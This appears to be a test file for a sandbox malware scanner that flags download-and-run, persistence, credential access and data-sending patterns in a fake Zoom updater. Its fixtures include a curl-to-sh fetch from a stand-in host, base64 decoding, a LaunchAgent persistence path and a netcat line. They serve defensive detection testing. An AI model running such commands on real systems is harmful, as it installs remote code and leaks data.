import { describe, expect, it } from 'vitest'
import type { LiveEventBody } from '@shared/live'
import type { Observation, SampleMeta } from './daytona'
import { sandboxToolSpecs } from './droidLockdown'
import { excerpt, findPatterns, scriptedAgent, summarize } from './liveAgent'
import { FAKE_INSTALLER } from './testSamples'

const TERMINAL_DEMO = `#!/bin/sh
# Harmless execution fixture.
printf '%s\\n' 'AEGIS DEMO: A downloaded script was executed.' 'AEGIS_DEMO_EXECUTED'
exit 0
`

const meta = (filename: string): SampleMeta => ({
  filename,
  sha256: 'abc123',
  size: 100,
  url: null,
  referrer: null,
  contentType: null
})

const obs = (over: Partial<Observation> = {}): Observation => ({
  exitCode: 0,
  timedOut: false,
  stdout: '',
  stderr: '',
  commands: [],
  filesWritten: [],
  networkAttempts: [],
  ...over
})

const installerRun = obs({
  stdout: 'Installing Zoom update 6.4.1...\n',
  commands: [
    'curl -fsSL https://updates.zoom-support.invalid/stage2.sh',
    'sh',
    'base64 -d',
    'wget -q'
  ],
  filesWritten: ['home/Library/LaunchAgents/us.zoom.updater.plist'],
  networkAttempts: ['curl -fsSL https://updates.zoom-support.invalid/stage2.sh', 'wget -q']
})

describe('findPatterns', () => {
  it('finds every pattern in the fake installer, in source order, never on comment lines', () => {
    const hits = findPatterns(FAKE_INSTALLER, installerRun)
    expect(hits.map((h) => [h.pattern.code, h.lines[0]])).toEqual([
      ['download_and_run', 10],
      ['persistence', 13],
      ['credential_access', 24],
      ['hidden_command', 28],
      ['sends_data', 31]
    ])
    // Line 12 is the comment "# 2. Persistence: a LaunchAgent…": not evidence.
    expect(hits[1].lines).not.toContain(12)
  })

  it('finds nothing in the terminal demo', () => {
    expect(findPatterns(TERMINAL_DEMO, obs({ stdout: 'AEGIS_DEMO_EXECUTED\n' }))).toEqual([])
  })

  it('flags network use that no pattern explains', () => {
    const hits = findPatterns(
      'nc example.invalid 80\n',
      obs({ networkAttempts: ['nc example.invalid 80'] })
    )
    expect(hits.map((h) => h.pattern.code)).toEqual(['network_attempt'])
  })
})

describe('summarize', () => {
  it('makes the fake installer malicious through the download-and-run hard rule', () => {
    const s = summarize(
      FAKE_INSTALLER,
      findPatterns(FAKE_INSTALLER, installerRun),
      meta('zoom-update.sh'),
      installerRun
    )
    expect(s.verdict).toBe('malicious')
    expect(s.reasons.find((r) => r.code === 'download_and_run')?.hard).toBe(true)
    expect(s.summary).toMatch(
      /^It downloads and runs code from the internet, .* and sends data to a server\.$/
    )
    expect(s.code[0].flags.map((f) => f.line)).toContain(10)
    expect(s.findings[1].detail).toContain('home/Library/LaunchAgents/us.zoom.updater.plist')
  })

  it('calls a quiet run Clean, and says what it did', () => {
    const run = obs({ stdout: 'AEGIS_DEMO_EXECUTED\n' })
    const s = summarize(TERMINAL_DEMO, [], meta('demo.command'), run)
    expect(s.verdict).toBe('clean')
    expect(s.summary).toBe(
      'It ran in the sandbox, printed a message, wrote 0 files and tried no network.'
    )
  })

  it('never says Clean when the file could not run', () => {
    expect(summarize(TERMINAL_DEMO, [], meta('demo.command'), null).verdict).toBe('unknown')
    expect(
      summarize(TERMINAL_DEMO, [], meta('demo.command'), obs({ timedOut: true })).verdict
    ).toBe('unknown')
  })
})

describe('scriptedAgent', () => {
  it('uses only the fixed tools, narrates each call, and marks its report as scripted', async () => {
    const events: Array<Extract<LiveEventBody, { kind: 'agent' }>> = []
    const tools = sandboxToolSpecs('sample/file')
    const ran: string[] = []
    const result = await scriptedAgent({ paceMs: 0 }).review({
      filename: 'zoom-update.sh',
      meta: meta('zoom-update.sh'),
      observation: installerRun,
      tools,
      runTool: async (name) => {
        ran.push(name)
        if (name === 'describe_sample') return { exitCode: 0, output: '100\nabc123  sample/file\n' }
        if (name === 'read_sample') return { exitCode: 0, output: FAKE_INSTALLER }
        return { exitCode: 0, output: 'file\nmeta.json\n' }
      },
      emit: (e) => events.push(e)
    })
    expect(ran).toEqual(['list_sample_files', 'describe_sample', 'read_sample'])
    expect(events.filter((e) => e.step === 'tool').map((e) => e.command)).toEqual(
      tools.map((t) => t.command)
    )
    expect(
      events.some((e) => e.step === 'thought' && e.text === 'The SHA-256 matches the download.')
    ).toBe(true)
    expect(events[events.length - 1]).toMatchObject({ step: 'verdict', verdict: 'malicious' })
    expect(result.report.reviewer).toBe('scripted')
    expect(result.report.unknowns[0]).toMatch(/scripted stand-in/)
    expect(result.report.timeline.map((t) => t.step)).toEqual([1, 2, 3, 4, 5])
  })
})

describe('excerpt', () => {
  it('keeps the first lines and cuts long output', () => {
    expect(excerpt('a\nb\nc\nd\ne\nf')).toBe('a\nb\nc\nd')
    expect(excerpt('x'.repeat(400))).toHaveLength(321)
  })
})
